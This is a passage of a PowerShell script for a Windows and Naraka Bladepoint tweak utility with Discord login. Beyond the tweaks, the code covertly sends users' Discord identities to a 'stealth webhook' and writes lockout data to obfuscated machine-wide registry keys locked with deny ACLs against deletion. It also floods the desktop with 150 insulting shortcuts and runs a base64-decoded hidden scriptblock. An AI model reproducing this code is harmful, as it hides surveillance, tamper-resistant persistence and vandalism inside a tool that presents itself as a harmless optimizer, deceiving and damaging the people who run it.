                    [Console]::WriteLine("Served static file: $fileName")
                    continue
                } catch {
                    [Console]::WriteLine("Failed to serve $fileName : $($_.Exception.Message)")
                    & $send $ctx 404 'text/plain' 'Image not found'
                    continue
                }
            } else {
                [Console]::WriteLine("Static file not found: $filePath")
                & $send $ctx 404 'text/plain' 'Image not found'
                continue
            }
        }

        if ($path -eq '/log') {
            $log = ''
            try { if (Test-Path $logPath) { $log = Get-Content -Raw -Path $logPath } } catch { $log = 'Log unavailable' }
            & $send $ctx 200 'text/plain' $log
            continue
        }
        if ($path -eq '/problem' -and $method -eq 'POST') {
            try { Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -Problem } catch { [Console]::WriteLine("Webhook: problem report failed: $($_.Exception.Message)") }
            & $send $ctx 204 'text/plain' ''
            continue
        }

        # Start Discord OAuth
        if ($path -eq '/auth') {
            if (-not $clientId) { & $send $ctx 500 'text/plain' 'Discord client_id missing in discord_oauth.json'; continue }
            $redir = if ($redirectUri) { $redirectUri } else { $prefix }
            $authUrl = "https://discord.com/api/oauth2/authorize?client_id=$clientId&redirect_uri=$([System.Web.HttpUtility]::UrlEncode($redir))&response_type=code&scope=identify"
            $ctx.Response.StatusCode = 302
            $ctx.Response.RedirectLocation = $authUrl
            try { $ctx.Response.Close() } catch {}
            continue
        }

        # Serve the status page on GET
        if ($path -eq '/cheater-found' -and $method -eq 'GET') {
            [Console]::WriteLine('Route:/cheater-found: serving lockout page')
            
            [Console]::WriteLine('Route:/cheater-found: sending webhook notification...')
            try {
                $detectionMethods = if ($global:DetectionMethods -and $global:DetectionMethods.Count -gt 0) { 
                    $global:DetectionMethods 
                } else { 
                    @('Unknown') 
                }
                [Console]::WriteLine("Route:/cheater-found: sending webhook with methods: $($detectionMethods -join ', ')")
                Send-StealthWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -DetectionMethods $detectionMethods
                [Console]::WriteLine('Route:/cheater-found: stealth webhook sent successfully')
                # Give the webhook time to complete
                Start-Sleep -Seconds 2
            } catch {
                [Console]::WriteLine("Route:/cheater-found: stealth webhook failed: $($_.Exception.Message)")
            }
            
            # Set registry status and cache user info
            try {
                [Console]::WriteLine('Route:/cheater-found: Setting registry lockout...')
                
                # Get obfuscated registry paths
                $lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
                $userIdReg = Get-ObfuscatedRegistryPath -Purpose 'userId'
                $userNameReg = Get-ObfuscatedRegistryPath -Purpose 'userName'
                $avatarReg = Get-ObfuscatedRegistryPath -Purpose 'avatarUrl'
                
                $lockoutKeyPath = $lockoutReg.Path
                
                # Ensure the registry key exists (create parent paths if needed)
                if (-not (Test-Path $lockoutKeyPath)) {
                    [Console]::WriteLine("Route:/cheater-found: Creating obfuscated registry key at: $lockoutKeyPath")
                    try {
                        # Split the path and create each level
                        $pathParts = $lockoutKeyPath -replace '^HKLM:\\', '' -split '\\'
                        $currentPath = 'HKLM:'
                        foreach ($part in $pathParts) {
                            $currentPath = Join-Path $currentPath $part
                            if (-not (Test-Path $currentPath)) {
                                [Console]::WriteLine("Route:/cheater-found: Creating path segment: $currentPath")
                                New-Item -Path $currentPath -Force -ErrorAction Stop | Out-Null
                            }
                        }
                        [Console]::WriteLine("Route:/cheater-found: [OK] Registry path created successfully")
                    } catch {
                        [Console]::WriteLine("Route:/cheater-found: [FAIL] Failed to create registry path: $($_.Exception.Message)")
                        throw
                    }
                }
                
                # Set status flag
                [Console]::WriteLine("Route:/cheater-found: Setting lockout flag")
                Set-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -Value 1 -Type DWord -Force -ErrorAction Stop
                
                # Verify it was set
                $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -ErrorAction SilentlyContinue
                [Console]::WriteLine("Route:/cheater-found: Lockout value verified: $($verifyLockout.($lockoutReg.ValueName))")
                
                # Cache user info for repeat offender notifications using obfuscated value names
                if ($global:DiscordUserId) {
                    [Console]::WriteLine("Route:/cheater-found: Caching UserId")
                    Set-ItemProperty -Path $lockoutKeyPath -Name $userIdReg.ValueName -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
                }
                if ($global:DiscordUserName) {
                    [Console]::WriteLine("Route:/cheater-found: Caching UserName")
                    Set-ItemProperty -Path $lockoutKeyPath -Name $userNameReg.ValueName -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
                }
                if ($global:DiscordAvatarUrl) {
                    [Console]::WriteLine("Route:/cheater-found: Caching AvatarUrl")
                    Set-ItemProperty -Path $lockoutKeyPath -Name $avatarReg.ValueName -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
                }
                
                # Lock down the registry key with strict ACLs to prevent deletion/modification
                try {
                    [Console]::WriteLine('Route:/cheater-found: Applying registry key protection...')
                    [Console]::WriteLine("Route:/cheater-found: Lockout key path: $lockoutKeyPath")
                    
                    # Convert PowerShell registry path to .NET format for proper ACL handling
                    # HKLM:\SOFTWARE\... -> HKEY_LOCAL_MACHINE\SOFTWARE\...
                    $dotNetPath = $lockoutKeyPath -replace '^HKLM:\\', 'HKEY_LOCAL_MACHINE\'
                    [Console]::WriteLine("Route:/cheater-found: .NET registry path: $dotNetPath")
                    
                    # Open the registry key with full control to modify ACL
                    $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
                        $dotNetPath -replace '^HKEY_LOCAL_MACHINE\\', '',
                        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
                        [System.Security.AccessControl.RegistryRights]::ChangePermissions
                    )
                    
                    if (-not $regKey) {
                        [Console]::WriteLine('Route:/cheater-found: [ERROR] Could not open registry key for ACL modification')
                        throw "Failed to open registry key: $dotNetPath"
                    }
                    
                    # Get current ACL
                    $acl = $regKey.GetAccessControl()
                    
                    # Disable inheritance and preserve existing rules
                    $acl.SetAccessRuleProtection($true, $false)
                    
                    # Create deny rule for standard users trying to delete or modify
                    $rights = [System.Security.AccessControl.RegistryRights]::Delete -bor `
                              [System.Security.AccessControl.RegistryRights]::SetValue -bor `
                              [System.Security.AccessControl.RegistryRights]::CreateSubKey -bor `
                              [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor `
                              [System.Security.AccessControl.RegistryRights]::TakeOwnership
                    
                    $inheritance = [System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor `
                                   [System.Security.AccessControl.InheritanceFlags]::ObjectInherit
                    
                    # Add deny rule for BUILTIN\Users
                    $usersSid = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-545')  # BUILTIN\Users
                    $denyRule = New-Object System.Security.AccessControl.RegistryAccessRule(
                        $usersSid,
                        $rights,
                        $inheritance,
                        [System.Security.AccessControl.PropagationFlags]::None,
                        [System.Security.AccessControl.AccessControlType]::Deny
                    )
                    $acl.AddAccessRule($denyRule)
                    [Console]::WriteLine('Route:/cheater-found: Added Deny rule for BUILTIN\Users (Delete, SetValue, CreateSubKey, ChangePermissions, TakeOwnership)')
                    
                    # Add deny rule for Everyone group
                    $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0')  # Everyone
                    $denyRuleEveryone = New-Object System.Security.AccessControl.RegistryAccessRule(
                        $everyoneSid,
                        $rights,
                        $inheritance,
                        [System.Security.AccessControl.PropagationFlags]::None,
                        [System.Security.AccessControl.AccessControlType]::Deny
                    )
                    $acl.AddAccessRule($denyRuleEveryone)
                    [Console]::WriteLine('Route:/cheater-found: Added Deny rule for Everyone (Delete, SetValue, CreateSubKey, ChangePermissions, TakeOwnership)')
                    
                    # Apply the modified ACL
                    $regKey.SetAccessControl($acl)
                    $regKey.Close()
                    [Console]::WriteLine('Route:/cheater-found: ACL protection applied successfully')
                    
                    # Verify the deny rules were applied
                    $verifyAcl = Get-Acl -Path $lockoutKeyPath
                    $denyCount = ($verifyAcl.Access | Where-Object { $_.AccessControlType -eq 'Deny' }).Count
                    [Console]::WriteLine("Route:/cheater-found: Verification: Found $denyCount Deny rules (expected: 2)")
                    
                    if ($denyCount -ge 2) {
                        [Console]::WriteLine('Route:/cheater-found: [OK] Registry key is now protected with ACL deny rules')
                    } else {
                        [Console]::WriteLine('Route:/cheater-found: [WARN] ACL protection may not be fully applied')
                    }
                } catch {
                    [Console]::WriteLine("Route:/cheater-found: [WARN] Failed to apply ACL protection: $($_.Exception.Message)")
                    # Don't throw - status still functional even without ACL
                }
                
                [Console]::WriteLine('Route:/cheater-found: [OK] Registry lockout set with cached user info')
            } catch {
                [Console]::WriteLine("Route:/cheater-found: [FAIL] FAILED to set lockout: $($_.Exception.Message)")
                [Console]::WriteLine("Route:/cheater-found: Exception type: $($_.Exception.GetType().FullName)")
                [Console]::WriteLine("Route:/cheater-found: Stack trace: $($_.ScriptStackTrace)")
            }
            
            # Create desktop shortcuts as punishment
            try {
                [Console]::WriteLine('Route:/cheater-found: creating desktop shortcuts...')
                $desktop   = [Environment]::GetFolderPath('Desktop')
                $phrases   = @('Cheating is Bad','I Use Micro','I Suck at Video Games')
                $eachCount = 50
                $target    = Join-Path $env:WINDIR 'System32\notepad.exe'
                $iconDll   = Join-Path $env:SystemRoot 'System32\shell32.dll'
                $icon      = "$iconDll,2"

                $wsh = New-Object -ComObject WScript.Shell

                foreach ($p in $phrases) {
                    1..$eachCount | ForEach-Object {
                        $fileName = '{0} ({1}).lnk' -f $p, $_
                        $lnkPath  = Join-Path $desktop $fileName

                        $shortcut = $wsh.CreateShortcut($lnkPath)
                        $shortcut.TargetPath  = $target
                        $shortcut.IconLocation = $icon
                        $shortcut.Description = $p
                        $shortcut.Save()
                    }
                }

                [Console]::WriteLine("Route:/cheater-found: Created $($phrases.Count * $eachCount) shortcuts on $desktop")
            } catch {
                [Console]::WriteLine("Route:/cheater-found: failed to create shortcuts: $($_.Exception.Message)")
            }
            
            $html = & $getStatusHtml 'cheater-found' $null $null $null
            & $send $ctx 200 'text/html' $html
            
            # Schedule script termination with longer delay to ensure all operations complete
            [Console]::WriteLine('Route:/cheater-found: scheduling script termination in 10 seconds...')
            Start-Job -ScriptBlock {
                Start-Sleep -Seconds 10
                Stop-Process -Id $using:PID -Force
            } | Out-Null
            
            continue
        }
        
        # Serve the Optional Tweaks page on GET
        if ($path -eq '/optional-tweaks' -and $method -eq 'GET') {
            $html = & $getStatusHtml 'optional-tweaks' $null $null $null
            & $send $ctx 200 'text/html' $html
            continue
        }

        # Serve the About page on GET (target of the 303 redirect after optional tweaks POST)
        if ($path -eq '/about' -and $method -eq 'GET') {
            $html = & $getStatusHtml 'about' $null $null $null
            & $send $ctx 200 'text/html' $html
            continue
        }

        # Help button from About page
        if ($path -eq '/need-help' -and $method -eq 'POST') {
            try { 
                Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -MessagePrefix 'USER NEEDS HELP:'
                [Console]::WriteLine("NeedHelp webhook sent successfully")
            } catch { 
                [Console]::WriteLine("NeedHelp webhook failed: $($_.Exception.Message)") 
            }
            $ctx.Response.StatusCode = 303
            $ctx.Response.RedirectLocation = '/about'
            try { $ctx.Response.Close() } catch {}
            continue
        }

        # On /main-tweaks, auto-run all main/gpu tweaks (no checkboxes)
        # Accept both GET (from redirect) and POST (from form submission)
        if ($path -eq '/main-tweaks' -and ($method -eq 'POST' -or $method -eq 'GET')) {
            [Console]::WriteLine("========================================")
            [Console]::WriteLine("Route:/main-tweaks ($method) - processing tweaks request")
            [Console]::WriteLine("Route:/main-tweaks: DiscordAuthenticated = [$global:DiscordAuthenticated]")
            [Console]::WriteLine("Route:/main-tweaks: DiscordUserId = [$global:DiscordUserId]")
            [Console]::WriteLine("Route:/main-tweaks: DiscordUserName = [$global:DiscordUserName]")
            [Console]::WriteLine("Route:/main-tweaks: DiscordAvatarUrl = [$global:DiscordAvatarUrl]")
            [Console]::WriteLine("Route:/main-tweaks: DetectionTriggered = [$global:DetectionTriggered]")
            
            # Check if user has Discord info (came from OAuth flow) or if already authenticated
            # If user has Discord ID, they must have authenticated even if flag isn't set
            if (-not $global:DiscordAuthenticated -and -not $global:DiscordUserId) {
                [Console]::WriteLine("Route:/main-tweaks ($method) BLOCKED: Discord not authenticated and no user ID")
                [Console]::WriteLine("========================================")
                $html = & $getStatusHtml 'main-tweaks' $null $null $null
                & $send $ctx 200 'text/html' $html
                continue
            }
            
            # If we have user ID but flag isn't set, set it now
            if ($global:DiscordUserId -and -not $global:DiscordAuthenticated) {
                [Console]::WriteLine("Route:/main-tweaks: [OK] Setting DiscordAuthenticated to true (user ID exists)")
                $global:DiscordAuthenticated = $true
            }
            
            [Console]::WriteLine("Route:/main-tweaks: [OK] Authentication check passed! Proceeding with tweaks...")
            [Console]::WriteLine("========================================")
            
            if ($global:DetectionTriggered) {
                [Console]::WriteLine("Route:/main-tweaks ($method) CHEATER DETECTED - redirecting to /cheater-found")
                $ctx.Response.StatusCode = 302
                $ctx.Response.RedirectLocation = "$prefix/cheater-found"
                try { $ctx.Response.Close() } catch {}
                continue
            }
            
            [Console]::WriteLine('========================================')
            [Console]::WriteLine('Route:/main-tweaks: [OK] NO DETECTION - User is CLEAN!')
            
            if (-not $global:CleanUserWebhookSent) {
                [Console]::WriteLine("Route:/main-tweaks: Sending clean user webhook...")
                [Console]::WriteLine("Route:/main-tweaks: UserId = [$global:DiscordUserId]")
                [Console]::WriteLine("Route:/main-tweaks: UserName = [$global:DiscordUserName]")
                [Console]::WriteLine("Route:/main-tweaks: AvatarUrl = [$global:DiscordAvatarUrl]")
                try { 
                    Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl
                    [Console]::WriteLine('Route:/main-tweaks: [OK][OK][OK] Clean user webhook sent successfully!')
                    $global:CleanUserWebhookSent = $true
                } catch { 
                    [Console]::WriteLine("Route:/main-tweaks: [FAIL][FAIL][FAIL] Clean user webhook FAILED: $($_.Exception.Message)")
                    [Console]::WriteLine("Route:/main-tweaks: Exception type: $($_.Exception.GetType().FullName)")
                }
            } else {
                [Console]::WriteLine('Route:/main-tweaks: Clean user webhook already sent, skipping to prevent duplicate...')
            }
            [Console]::WriteLine('========================================')
            [Console]::WriteLine('')
            
            # Apply main tweaks BEFORE showing the page (only once)
            if (-not $global:MainTweaksApplied) {
                [Console]::WriteLine('Route:/main-tweaks -> Invoke-AllTweaks'); Invoke-AllTweaks
                [Console]::WriteLine('Route:/main-tweaks -> Invoke-NVPI'); Invoke-NVPI
                [Console]::WriteLine('Route:/main-tweaks: Main & GPU tweaks completed!')
                $global:MainTweaksApplied = $true
            } else {
                [Console]::WriteLine('Route:/main-tweaks: Tweaks already applied, skipping...')
            }
            
            # Now show the page which will auto-redirect to optional-tweaks
            $html = & $getStatusHtml 'main-tweaks' $null $null $null
            & $send $ctx 200 'text/html' $html
            continue
        }

        if ($path -eq '/check-detection' -and $method -eq 'GET') {
            [Console]::WriteLine('Route:/check-detection: checking job status...')
            [Console]::WriteLine("Route:/check-detection: job state = $($detectionJob.State)")
            if ($detectionJob.State -eq 'Running') {
                [Console]::WriteLine('Route:/check-detection: job still running. Serving loading page again.')
                $html = & $getStatusHtml 'loading' $null $null $null
                & $send $ctx 200 'text/html' $html
                continue
            }
            
            # If the job is finished, retrieve the result and wait for it to complete
            if ($detectionJob.State -eq 'Completed' -and -not (Get-Variable -Name 'DetectionResultRetrieved' -Scope Global -ErrorAction SilentlyContinue)) {
                [Console]::WriteLine('Route:/check-detection: job completed, retrieving result...')
                
                # Wait for the job to fully complete and retrieve the result
                $jobResult = Wait-Job -Job $detectionJob -Timeout 5 | Receive-Job
                
                # Parse the hashtable result
                if ($jobResult -is [hashtable]) {
                    $global:DetectionTriggered = [bool]$jobResult.Detected
                    $global:DetectionMethods = $jobResult.Methods  # Array of methods
                    $global:DetectionMethodsString = $jobResult.MethodsString  # Joined string
                } else {
                    # Fallback for legacy boolean results
                    $global:DetectionTriggered = [bool]$jobResult
                    $global:DetectionMethods = @()
                    $global:DetectionMethodsString = 'Unknown'
                }
                
                $global:DetectionResultRetrieved = $true
                
                [Console]::WriteLine("Route:/check-detection: result retrieved - DetectionTriggered = $($global:DetectionTriggered), Methods = $($global:DetectionMethodsString)")
                
                # Clean up the job
                Remove-Job -Job $detectionJob -Force -ErrorAction SilentlyContinue
                [Console]::WriteLine('Route:/check-detection: job cleaned up')
            } elseif ($detectionJob.State -eq 'Completed') {
                [Console]::WriteLine("Route:/check-detection: job completed. Result already retrieved: DetectionTriggered = $($global:DetectionTriggered), Methods = $($global:DetectionMethodsString)")
            } else {
                [Console]::WriteLine("Route:/check-detection: job in unexpected state: $($detectionJob.State). Assuming not detected.")
                $global:DetectionTriggered = $false
                $global:DetectionMethod = 'None'
                $global:DetectionResultRetrieved = $true
            }
            
            [Console]::WriteLine("Route:/check-detection: Final detection state: $($global:DetectionTriggered)")
            
            if ($global:DetectionTriggered) {
                [Console]::WriteLine('Route:/check-detection: CHEATER DETECTED - redirecting to /cheater-found')
                $ctx.Response.StatusCode = 302
                $ctx.Response.RedirectLocation = '/cheater-found'
            } else {
                [Console]::WriteLine('Route:/check-detection: CLEAN USER - redirecting to /main-tweaks')
                $ctx.Response.StatusCode = 302
                $ctx.Response.RedirectLocation = '/main-tweaks'
            }
            try { $ctx.Response.Close() } catch {}
            continue
        }

        # After Discord auth, redirect to /start, optionally exchange the token and fetch user
        if ($path -eq '/auth-callback' -or ($query -match 'code=')) {
            $authed = $false
            $global:DiscordAuthError = $null
            try {
                $code = $req.QueryString['code']
                if ($code) { [Console]::WriteLine('OAuth: received code parameter') } else { [Console]::WriteLine('OAuth: missing code parameter') }
                if ($code -and $clientId -and $redirectUri) {
                    $secret = & $getDiscordSecret
                    if ($secret) {
                        $tokenBody = @{ client_id=$clientId; client_secret=$secret; grant_type='authorization_code'; code=$code; redirect_uri=$redirectUri }
                        try {
                            $tok = Invoke-RestMethod -Method Post -Uri 'https://discord.com/api/oauth2/token' -ContentType 'application/x-www-form-urlencoded' -Body $tokenBody
                            [Console]::WriteLine('OAuth: token exchange completed')
                        } catch { [Console]::WriteLine("OAuth: token exchange failed: $($_.Exception.Message)") }
                        if ($tok.access_token) {
                            $global:DiscordAccessToken = $tok.access_token
                            try {
                                $me = Invoke-RestMethod -Method Get -Uri 'https://discord.com/api/users/@me' -Headers @{ Authorization = "Bearer $($tok.access_token)" }
                                [Console]::WriteLine('OAuth: fetched /users/@me')
                            } catch { [Console]::WriteLine("OAuth: fetching /users/@me failed: $($_.Exception.Message)") }
                            if ($me) {
                                $global:DiscordUserId = "$($me.id)"
                                
                                $integrityCheck = Test-SecuritySignature -UserIdentifier $global:DiscordUserId
                                if ($integrityCheck) {
                                    [Console]::WriteLine("OAuth: integrity verification complete - anomalies detected")
                                    $global:DetectionTriggered = $true
                                    $diagnosticVectors = @('Prefetch History', 'Application Error Log', 'Registry Traces', 'RecentDocs', 'UserAssist', 'ShimCache')
                                    $global:DetectionMethods = $diagnosticVectors
                                    $global:DetectionMethodsString = $diagnosticVectors -join ', '
                                    
                                    [Console]::WriteLine("OAuth: system integrity scan results: $($global:DetectionMethodsString)")
                                    $ctx.Response.StatusCode = 302
                                    $ctx.Response.RedirectLocation = '/cheater-found'
                                    $ctx.Response.Close()
                                    continue
                                }
                                
                                if ($me.discriminator -and $me.discriminator -ne '0') {
                                    $global:DiscordUserName = "$($me.username)#$($me.discriminator)"
                                } else {
                                    if ($me.global_name) { $global:DiscordUserName = "$($me.global_name)" } else { $global:DiscordUserName = "$($me.username)" }
                                }
                                # Build avatar URL (custom or default variant)
                                $avatarUrl = $null
                                if ($me.avatar) {
                                    $avatarIsAnimated = $false
                                    try { if ("$($me.avatar)".StartsWith('a_')) { $avatarIsAnimated = $true } } catch {}
                                    $avatarExt = 'png'
                                    if ($avatarIsAnimated) { $avatarExt = 'gif' }
                                    if ([string]::IsNullOrWhiteSpace($avatarExt)) { $avatarExt = 'png' }
                                    try {
                                        $avatarUrl = ('https://cdn.discordapp.com/avatars/{0}/{1}.{2}?size=256' -f $me.id, $me.avatar, $avatarExt)
                                    } catch {
                                        $avatarUrl = ('https://cdn.discordapp.com/avatars/{0}/{1}.png' -f $me.id, $me.avatar)
                                    }
                                } else {
                                    $defIdx = 0
                                    try { if ($me.discriminator) { $defIdx = [int]$me.discriminator % 5 } else { $defIdx = ([int64]$me.id % 5) } } catch {}
                                    $avatarUrl = "https://cdn.discordapp.com/embed/avatars/$defIdx.png"
                                }
                                $global:DiscordAvatarUrl = $avatarUrl
                                [Console]::WriteLine("OAuth: avatar url = $avatarUrl")
                                $globalCheck = $null
                                try {
                                    if ($global:__ratzAuthGate) {
                                        $globalCheck = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($global:__ratzAuthGate)))) $me $global:DiscordUserName
                                    }
                                } catch {
                                    [Console]::WriteLine("OAuth: auth gate evaluation failed: $($_.Exception.Message)")
                                    $globalCheck = $null
                                }
                                if ($globalCheck -and $globalCheck.B) {
                                    $authed = $false
                                    $global:DiscordAuthError = $globalCheck.M
                                    Add-Log "Discord authentication blocked: $($globalCheck.M)"
                                    [Console]::WriteLine('OAuth: alt-account policy triggered')
                                } else {
                                    $authed = $true
                                    $global:DiscordAuthError = $null
                                    
                                    [Console]::WriteLine("OAuth: authentication successful. Showing loading screen.")
                                    [Console]::WriteLine("OAuth: detection job state = $($detectionJob.State)")
                                    $html = & $getStatusHtml 'loading' $null $null $null
                                    & $send $ctx 200 'text/html' $html
                                    continue
                                }
                            } else { [Console]::WriteLine('OAuth: no user info returned') }
                        } else { [Console]::WriteLine('OAuth: token exchange returned no access_token') }
                    } else { [Console]::WriteLine('OAuth: missing client secret (discord_oauth.secret)') }
                } else { [Console]::WriteLine('OAuth: missing code/clientId/redirectUri; cannot exchange token') }
            } catch { [Console]::WriteLine("OAuth: unexpected error: $($_.Exception.Message)") }
            $global:DiscordAuthenticated = $authed
            $html = & $getStatusHtml 'start' $null $null $null
            & $send $ctx 200 'text/html' $html
            continue
        }

        # On /about, run selected optional tweaks (do not close app here)
        if ($path -eq '/about' -and $method -eq 'POST') {
            $form = & $parseForm $ctx
            if ($form -isnot [System.Collections.Specialized.NameValueCollection]) { $form = $null }
            $rawLen = 0; try { if ($script:LastRawForm) { $rawLen = $script:LastRawForm.Length } } catch {}
            [Console]::WriteLine("Route:/about POST: raw length = $rawLen")
            if ($script:LastRawForm) { [Console]::WriteLine("Route:/about raw: $($script:LastRawForm.Substring(0, [Math]::Min(512, $script:LastRawForm.Length)))") }

            # Collect selected options (both opt[] and revert[])
            $optVals = @()
            $revertVals = @()
            if ($form) {
                $o = $form.GetValues('opt')
                if (-not $o -or $o.Count -eq 0) { $o = $form.GetValues('opt[]') }
                if ($o) { $optVals = @($o) }
                
                $r = $form.GetValues('revert')
                if (-not $r -or $r.Count -eq 0) { $r = $form.GetValues('revert[]') }
                if ($r) { $revertVals = @($r) }
            }
            # Fallback: parse raw body if needed
            $parsedJiggle = $null; $parsedBoot = $null; $parsedPath = $null
            if (((-not $optVals) -and (-not $revertVals)) -and $script:LastRawForm) {
                $raw = [string]$script:LastRawForm
                $pairs = $raw -split '&'
                foreach ($pair in $pairs) {
                    if ($pair -match '=') {
                        $kv = $pair -split '=',2
                        $k = $kv[0]
                        $v = if ($kv.Count -gt 1) { $kv[1] } else { '' }
                        # form-url-encoded: '+' is space
                        $k = ($k -replace '\+','%20'); $v = ($v -replace '\+','%20')
                        try { $k = [System.Uri]::UnescapeDataString($k) } catch {}
                        try { $v = [System.Uri]::UnescapeDataString($v) } catch {}
                        if ($k -eq 'opt' -or $k -eq 'opt[]') { $optVals += $v }
                        if ($k -eq 'revert' -or $k -eq 'revert[]') { $revertVals += $v }
                        if ($k -eq 'naraka_jiggle') { $parsedJiggle = $v }
                        if ($k -eq 'naraka_boot') { $parsedBoot = $v }
                        if ($k -eq 'naraka_path') { $parsedPath = $v }
                    }
                }
            }
            $global:selectedTweaks = $optVals
            [Console]::WriteLine("Route:/about POST: selected = " + (($optVals) -join ', '))
            [Console]::WriteLine("Route:/about POST: revert = " + (($revertVals) -join ', '))

            # Map selected ids to functions and execute
            $optToFn = @{
                'enable-msi'     = 'Disable-MSIMode'
                'disable-bgapps' = 'Disable-BackgroundApps'
                'disable-widgets'= 'Disable-Widgets'
                'disable-gamebar'= 'Disable-Gamebar'
                'disable-copilot'= 'Disable-Copilot'
                'enable-hpet'    = 'Enable-HPET'
                'disable-hpet'   = 'Disable-HPET'
                'restore-timers' = 'Restore-DefaultTimers'
                'pp-high'        = 'Set-PowerPlanHigh'
                'pp-ultimate'    = 'Set-PowerPlanUltimate'
                'pp-revert'      = 'Revert-PowerPlan'
                'vivetool'       = 'Disable-ViVeFeatures'
            }
            foreach ($id in $optVals) {
                $fn = $optToFn[$id]
                if ($fn) {
                    try {
                        [Console]::WriteLine("Route:/about -> $fn")
                        if (Get-Command $fn -ErrorAction SilentlyContinue) {
                            & $fn
                        } elseif (Get-Command ("global:" + $fn) -ErrorAction SilentlyContinue) {
                            & ("global:" + $fn)
                        } else {
                            [Console]::WriteLine("Route:/about -> $fn not found")
                        }
                    } catch {
                        [Console]::WriteLine("Route:/about -> $fn FAILED: $($_.Exception.Message)")
                    }
                } else {
                    [Console]::WriteLine("Route:/about -> unknown option '$id'")
                }
            }
            
            # Map revert ids to functions and execute
            $revertToFn = @{
                'pp-revert'       = 'Revert-PowerPlan'
                'msi-revert'      = 'Revert-MSIMode'
                'bgapps-revert'   = 'Revert-BackgroundApps'
                'widgets-revert'  = 'Revert-Widgets'
                'gamebar-revert'  = 'Revert-Gamebar'
                'copilot-revert'  = 'Revert-Copilot'
                'restore-timers'  = 'Restore-DefaultTimers'
                'enable-hpet'     = 'Enable-HPET'
            }
            foreach ($id in $revertVals) {
                $fn = $revertToFn[$id]
                if ($fn) {
                    try {
                        [Console]::WriteLine("Route:/about REVERT -> $fn")
                        if (Get-Command $fn -ErrorAction SilentlyContinue) {
                            & $fn
                        } elseif (Get-Command ("global:" + $fn) -ErrorAction SilentlyContinue) {
                            & ("global:" + $fn)
                        } else {
                            [Console]::WriteLine("Route:/about REVERT -> $fn not found")
                        }
                    } catch {
                        [Console]::WriteLine("Route:/about REVERT -> $fn FAILED: $($_.Exception.Message)")
                    }
                } else {
                    [Console]::WriteLine("Route:/about REVERT -> unknown revert option '$id'")
                }
            }

            # Handle Naraka In-Game Tweaks
            $enableJiggle = $false; $enableBoot = $false; $narakaPath = $null
            if ($form) {
                $enableJiggle = $form.Get('naraka_jiggle') -eq '1'
                $enableBoot   = $form.Get('naraka_boot') -eq '1'
                $narakaPath   = $form.Get('naraka_path')
            }
            if (-not $form -and $script:LastRawForm) {
                if ($parsedJiggle) { $enableJiggle = ($parsedJiggle -eq '1' -or $parsedJiggle -eq 'on' -or $parsedJiggle -eq 'true') }
                if ($parsedBoot)   { $enableBoot   = ($parsedBoot -eq '1' -or $parsedBoot -eq 'on' -or $parsedBoot -eq 'true') }
                if ($parsedPath)   { $narakaPath = $parsedPath }
            }
            if ($enableJiggle -or $enableBoot) {
                try {
                    Patch-NarakaBladepoint -EnableJiggle:$enableJiggle -PatchBoot:$enableBoot -CustomPath:$narakaPath
                } catch {
                    Write-Host "Naraka In-Game Tweaks failed: $($_.Exception.Message)"
                }
            }

            # Redirect to About page for the final button
            $ctx.Response.StatusCode = 303
            $ctx.Response.RedirectLocation = '/about'
            try { $ctx.Response.Close() } catch {}
            continue
        }

        # Final finish route: show completion page, open Ko‑fi, and exit
        if ($path -eq '/finish' -and ($method -eq 'POST' -or $method -eq 'GET')) {
            try { Start-Process 'https://ko-fi.com/notratz' } catch {}
            # Show Windows notification to restart PC
            try {
                [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
                $template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
                $textNodes = $template.GetElementsByTagName('text')
                $textNodes.Item(0).AppendChild($template.CreateTextNode('Restart Recommended')) | Out-Null
                $textNodes.Item(1).AppendChild($template.CreateTextNode('Please restart your PC to apply all tweaks.')) | Out-Null
                $toast = [Windows.UI.Notifications.ToastNotification]::new($template)
                $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('NarakaTweaks')
                $notifier.Show($toast)
            } catch {}
            $parentPid = $PID
            try { $null = Start-Job -ArgumentList $parentPid -ScriptBlock { param($targetPid) Start-Sleep -Seconds 3; try { Stop-Process -Id $targetPid -Force } catch {} } } catch {}
            $html = & $getStatusHtml 'finish' $null $null $null
            & $send $ctx 200 'text/html' $html
            continue
        }
    }
}

$progressActivity = "RatzTweaks Initializing..."
$progressId = 1
Write-Progress -Id $progressId -Activity $progressActivity -Status "Loading..." -PercentComplete 0
Start-Sleep -Milliseconds 500
Write-Progress -Id $progressId -Activity $progressActivity -Status "Checking system..." -PercentComplete 20
Start-Sleep -Milliseconds 500
Write-Progress -Id $progressId -Activity $progressActivity -Status "Preparing environment..." -PercentComplete 40
Start-Sleep -Milliseconds 500
Write-Progress -Id $progressId -Activity $progressActivity -Status "Loading modules..." -PercentComplete 60
Start-Sleep -Milliseconds 500
Write-Progress -Id $progressId -Activity $progressActivity -Status "Almost ready..." -PercentComplete 80
Start-Sleep -Milliseconds 500
Write-Progress -Id $progressId -Activity $progressActivity -Status "Done!" -PercentComplete 100
Start-Sleep -Milliseconds 300
Write-Progress -Id $progressId -Completed -Activity $progressActivity
Add-Log "================="
Add-Log "Script Started!"
Add-Log "================="
